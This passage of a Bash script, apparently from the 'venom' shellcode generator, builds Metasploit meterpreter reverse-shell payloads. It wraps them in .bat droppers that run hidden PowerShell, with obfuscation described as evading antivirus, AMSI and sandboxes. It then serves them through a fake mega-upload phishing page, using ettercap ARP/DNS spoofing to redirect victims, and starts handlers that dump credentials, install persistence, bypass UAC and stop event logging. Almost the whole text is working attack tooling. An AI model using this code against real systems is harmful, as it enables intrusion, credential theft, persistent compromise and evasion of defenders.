\"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n\n   else\n\n\n      P0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 350 --height 300) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|installer.bat|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.ps1 $ApAcHe/$N4m.ps1 > /dev/null 2>&1\n      cp installer.bat $ApAcHe/installer.bat > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|installer.bat|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.ps1 $ApAcHe/$N4m.ps1\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" \n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.ps1 > /dev/null 2>&1\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# ----------------------------------------------------\n# build shellcode in PSH-CMD (windows BAT) ReL1K :D \n# reproduction of powershell.bat payload in unicorn.py\n# ----------------------------------------------------\nsh_shellcode12 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ SHELLCODE NAME ☠\" --text \"Enter shellcode output name\\nexample: ReL1K\" --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"ReL1K\";fi\n\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nKEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)\nif [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw\"\nelse\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw\"\nfi\n\n\n# display shellcode\ndisp=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $disp\necho \"\"\nsleep 2\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\nsleep 2\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n# injecting shellcode into name\ncd $IPATH/output/\necho \"[☠] Injecting shellcode -> $N4m.bat!\"\nsleep 2\nOBF=$(zenity --list --title \"☠ AGENT STRING OBFUSCATION ☠\" --text \"Obfuscate the agent [ template ] command arguments ?\\nUsing special escape characters, whitespaces, concaternation, amsi\\nsandbox evasion and variables piped and de-obfuscated at runtime\\n'The agent will delay 3 sec is execution to evade sandbox detection'\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"None-Obfuscation (default)\" FALSE \"String Obfuscation (3 sec)\" FALSE \"Relik PS obfuscation\" --width 353 --height 255) > /dev/null 2>&1\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\necho \"@echo off&&powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp\" >> $N4m.bat\nelif [ \"$OBF\" = \"Relik PS obfuscation\" ]; then\necho \"powershell /w 1 /C \\\"s''v rl -;s''v Ln e''c;s''v mYz ((g''v rl).value.toString()+(g''v Ln).value.toString());powershell (g''v mYz).value.toString()('$disp')\\\"\" >> $N4m.bat\nelse\necho \"[✔] String obfuscation technics sellected ..\"\n# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)\n# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md\n# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy\n#\n# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp\necho \"@e%!%ch^O Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\\\".\\\"d^ll %temp%\\\\key^s\\\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\\\".\\\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\\\Sy^s%dE%te^m%-%32\\\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\\\\v1.0\\\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\\\"I\\\"^N 1 /^%$'''%n\\\"O\\\"N%Func%i  /^eN%GL% $disp),) %i% ,,)\" > $N4m.bat\nfi\nchmod +x $IPATH/output/$N4m.bat\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.bat\\nchose how to deliver: $N4m.bat\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 230) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.bat on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.bat|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.bat|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.bat|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.bat|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.bat|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           fi\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n           fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" 